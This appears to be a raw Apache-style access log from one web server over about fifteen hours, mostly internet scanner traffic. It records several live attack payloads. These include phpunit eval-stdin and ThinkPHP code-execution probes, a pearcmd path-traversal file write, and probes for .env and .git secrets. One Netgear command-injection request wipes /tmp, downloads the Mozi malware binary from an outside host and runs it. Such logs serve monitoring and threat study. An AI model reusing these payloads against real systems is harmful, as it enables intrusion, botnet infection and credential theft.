60.13.146.4 - - [18/Jan/2025:00:20:01 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:01 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:01 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:02 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:02 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:02 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:03 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:03 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:03 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:03 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:04 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:04 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:04 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:05 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:05 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:05 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:06 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:06 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:07 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:07 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:07 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
60.13.146.4 - - [18/Jan/2025:00:20:08 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
31.13.224.222 - - [18/Jan/2025:00:34:27 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 6.0.1; ONE E1003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
115.65.18.10 - - [18/Jan/2025:00:52:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [18/Jan/2025:00:55:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:00:55:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [18/Jan/2025:00:55:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [18/Jan/2025:01:03:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.242.226.10 - - [18/Jan/2025:01:04:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
167.172.72.201 - - [18/Jan/2025:01:12:06 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [18/Jan/2025:01:12:21 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
5.181.190.248 - - [18/Jan/2025:01:20:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.189.152.11 - - [18/Jan/2025:01:20:04 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [18/Jan/2025:01:20:16 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.172.72.201 - - [18/Jan/2025:01:25:17 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [18/Jan/2025:01:25:31 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.172.90.143 - - [18/Jan/2025:01:25:45 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [18/Jan/2025:01:25:57 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
78.153.140.147 - - [18/Jan/2025:01:30:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:01:30:03 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
206.168.34.209 - - [18/Jan/2025:01:38:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.209 - - [18/Jan/2025:01:38:10 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.209 - - [18/Jan/2025:01:38:12 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.209 - - [18/Jan/2025:01:38:13 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.209 - - [18/Jan/2025:01:38:15 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
24.187.100.235 - - [18/Jan/2025:01:49:52 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.226 - - [18/Jan/2025:02:40:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
3.128.254.105 - - [18/Jan/2025:02:47:32 +0000] "\x16\x03\x01" 400 524 "-" "-"
3.128.254.105 - - [18/Jan/2025:02:48:05 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
57.152.56.121 - - [18/Jan/2025:02:59:37 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
95.214.55.185 - - [18/Jan/2025:03:02:07 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
102.212.40.122 - - [18/Jan/2025:03:04:30 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.21.160.67:54094/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
185.16.39.104 - - [18/Jan/2025:03:05:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
67.80.239.203 - - [18/Jan/2025:03:21:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.147 - - [18/Jan/2025:03:56:16 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:03:56:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.142.146.175 - - [18/Jan/2025:04:03:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:04:03:44 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
92.255.57.58 - - [18/Jan/2025:04:10:28 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.235.24.155 - - [18/Jan/2025:04:17:04 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.142.146.175 - - [18/Jan/2025:04:30:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:04:30:18 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
193.34.212.75 - - [18/Jan/2025:04:47:37 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
211.40.201.57 - - [18/Jan/2025:04:55:53 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.147 - - [18/Jan/2025:05:08:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:05:08:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [18/Jan/2025:05:08:39 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
92.255.57.58 - - [18/Jan/2025:05:10:13 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [18/Jan/2025:05:10:20 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.235.24.144 - - [18/Jan/2025:05:17:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.255.57.58 - - [18/Jan/2025:05:23:08 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
35.94.63.148 - - [18/Jan/2025:05:31:56 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "python-requests/2.25.1"
46.19.138.234 - - [18/Jan/2025:05:35:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
108.247.20.241 - - [18/Jan/2025:05:42:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
210.50.98.51 - - [18/Jan/2025:05:46:48 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
114.32.176.167 - - [18/Jan/2025:06:03:26 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
210.50.98.51 - - [18/Jan/2025:06:10:43 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
120.61.1.171 - - [18/Jan/2025:06:11:48 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 302 350 "-" "-"
78.153.140.147 - - [18/Jan/2025:06:21:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:06:21:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.142.146.175 - - [18/Jan/2025:06:31:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:06:31:20 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
35.202.9.133 - - [18/Jan/2025:06:37:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
146.19.24.168 - - [18/Jan/2025:06:53:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
179.43.191.146 - - [18/Jan/2025:07:06:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [18/Jan/2025:07:10:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:07:10:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.190.28.21 - - [18/Jan/2025:07:19:01 +0000] "GET /.env HTTP/1.1" 302 387 "-" "python-requests/2.32.3"
80.82.77.202 - - [18/Jan/2025:07:27:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2869.0 Safari/537.36"
34.77.99.191 - - [18/Jan/2025:07:42:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
87.120.115.34 - - [18/Jan/2025:08:01:27 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
78.153.140.203 - - [18/Jan/2025:08:02:36 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.6) Gecko/20060808 Fedora/1.5.0.6-2.fc5 Firefox/1.5.0.6"
78.153.140.203 - - [18/Jan/2025:08:02:36 +0000] "GET /Demo/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)"
78.153.140.203 - - [18/Jan/2025:08:02:36 +0000] "GET /DEMO/.env HTTP/1.1" 302 331 "-" "Opera/9.62 (Windows NT 5.1; U; zh-cn) Presto/2.1.1"
78.153.140.203 - - [18/Jan/2025:08:02:37 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.203 - - [18/Jan/2025:08:02:37 +0000] "GET /Dev/.env HTTP/1.1" 302 331 "-" "Opera/9.02 (Windows NT 5.2; U; en)"
78.153.140.203 - - [18/Jan/2025:08:02:37 +0000] "GET /DEV/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.16) Gecko/20101130 MRA 5.4 (build 02647) Firefox/3.5.16 ( .NET CLR 3.5.30729; .NET4.0C)"
78.153.140.203 - - [18/Jan/2025:08:02:37 +0000] "GET /Doc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9"
78.153.140.203 - - [18/Jan/2025:08:02:38 +0000] "GET /DOC/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X; %lang2%) adbeat.com/policy AppleWebKit/534.46 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53"
57.152.56.31 - - [18/Jan/2025:08:30:08 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
86.142.75.71 - - [18/Jan/2025:08:33:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.147 - - [18/Jan/2025:08:54:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:08:54:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [18/Jan/2025:09:06:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.172.72.201 - - [18/Jan/2025:09:25:22 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [18/Jan/2025:09:25:32 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
193.142.146.175 - - [18/Jan/2025:09:29:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:09:29:15 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
206.189.152.11 - - [18/Jan/2025:09:33:32 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [18/Jan/2025:09:33:43 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.172.72.201 - - [18/Jan/2025:09:38:27 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [18/Jan/2025:09:38:38 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.99.67.123 - - [18/Jan/2025:09:39:04 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [18/Jan/2025:09:39:14 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
185.196.220.253 - - [18/Jan/2025:09:58:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
146.19.24.168 - - [18/Jan/2025:10:12:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
198.235.24.78 - - [18/Jan/2025:10:18:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.16.39.104 - - [18/Jan/2025:10:27:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.185 - - [18/Jan/2025:10:38:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [18/Jan/2025:10:56:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.147 - - [18/Jan/2025:10:56:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:10:56:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [18/Jan/2025:11:10:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
184.105.247.194 - - [18/Jan/2025:11:11:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
184.105.247.194 - - [18/Jan/2025:11:14:14 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
184.105.247.194 - - [18/Jan/2025:11:15:12 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
147.185.133.83 - - [18/Jan/2025:11:22:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
146.19.24.168 - - [18/Jan/2025:11:47:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
57.128.229.1 - - [18/Jan/2025:11:48:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
57.128.229.1 - - [18/Jan/2025:11:48:02 +0000] "GET /js/brand.js HTTP/1.1" 200 570 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
57.128.229.1 - - [18/Jan/2025:11:48:02 +0000] "GET /js/login.js HTTP/1.1" 200 922 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
51.254.59.113 - - [18/Jan/2025:12:06:37 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
193.142.146.175 - - [18/Jan/2025:12:09:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:12:09:36 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.147 - - [18/Jan/2025:12:18:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:12:18:38 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
57.152.78.4 - - [18/Jan/2025:12:39:52 +0000] "MGLNDD_34.93.54.196_80\n" 400 524 "-" "-"
193.34.212.75 - - [18/Jan/2025:13:04:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [18/Jan/2025:13:07:57 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
184.95.51.10 - - [18/Jan/2025:13:13:49 +0000] "GET /api/kernelspecs HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Safari/605.1.15"
139.59.101.104 - - [18/Jan/2025:13:16:04 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
146.19.24.168 - - [18/Jan/2025:13:35:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
210.141.211.104 - - [18/Jan/2025:14:25:37 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.142.146.175 - - [18/Jan/2025:14:27:03 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:14:27:04 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
80.82.77.202 - - [18/Jan/2025:14:29:51 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
78.153.140.147 - - [18/Jan/2025:14:47:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:14:47:25 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
118.139.241.211 - - [18/Jan/2025:14:51:26 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
64.62.197.172 - - [18/Jan/2025:14:57:52 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.147 - - [18/Jan/2025:15:01:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:15:01:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.34 - - [18/Jan/2025:15:14:35 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Fedora; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
185.196.220.253 - - [18/Jan/2025:15:42:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
